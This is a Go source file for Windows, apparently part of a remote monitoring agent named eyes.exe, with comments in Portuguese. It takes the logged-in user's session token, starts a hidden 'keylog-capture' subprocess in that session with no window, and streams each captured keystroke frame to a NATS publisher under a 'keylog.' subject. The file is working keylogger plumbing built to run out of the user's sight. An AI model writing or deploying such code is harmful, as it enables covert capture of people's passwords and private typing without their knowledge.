//go:build windows

package keylog

import (
	"bufio"
	"context"
	"encoding/json"
	"log/slog"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// spawnCaptureInUserSession inicia eyes.exe keylog-capture na sessao do usuario logado e repassa
// cada linha JSON como keyFrame para o publisher NATS do servico.
func spawnCaptureInUserSession(ctx context.Context, id string, pub publisher, log *slog.Logger) {
	tok, err := keylogUserToken()
	if err != nil {
		log.Warn("keylog: sem usuario logado para captura", "session", id, "erro", err)
		_ = pub.Publish("keylog."+id, keyFrame{Keys: "[nenhum usuario logado]", Ts: 0})
		return
	}
	defer tok.Close()

	exe, _ := os.Executable()
	cmd := exec.CommandContext(ctx, exe, "keylog-capture")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Token:         syscall.Token(tok),
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Warn("keylog: falha ao criar pipe", "session", id, "erro", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Warn("keylog: falha ao iniciar subprocesso", "session", id, "erro", err)
		_ = pub.Publish("keylog."+id, keyFrame{Keys: "[falha ao iniciar captura: " + err.Error() + "]", Ts: 0})
		return
	}

	log.Info("keylog: subprocesso iniciado na sessao do usuario", "session", id, "pid", cmd.Process.Pid)

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		var frame keyFrame
		if err := json.Unmarshal(scanner.Bytes(), &frame); err != nil {
			continue
		}
		_ = pub.Publish("keylog."+id, frame)
	}

	_ = cmd.Wait()
}

func keylogUserToken() (windows.Token, error) {
	console := windows.WTSGetActiveConsoleSessionId()
	var tok windows.Token
	if err := windows.WTSQueryUserToken(console, &tok); err == nil {
		return tok, nil
	}
	var sessions *windows.WTS_SESSION_INFO
	var count uint32
	if err := windows.WTSEnumerateSessions(0, 0, 1, &sessions, &count); err != nil {
		return 0, err
	}
	defer windows.WTSFreeMemory(uintptr(unsafe.Pointer(sessions)))
	list := unsafe.Slice(sessions, count)
	for _, s := range list {
		if s.State == windows.WTSActive {
			if err := windows.WTSQueryUserToken(s.SessionID, &tok); err == nil {
				return tok, nil
			}
		}
	}
	return 0, windows.ERROR_NO_TOKEN
}
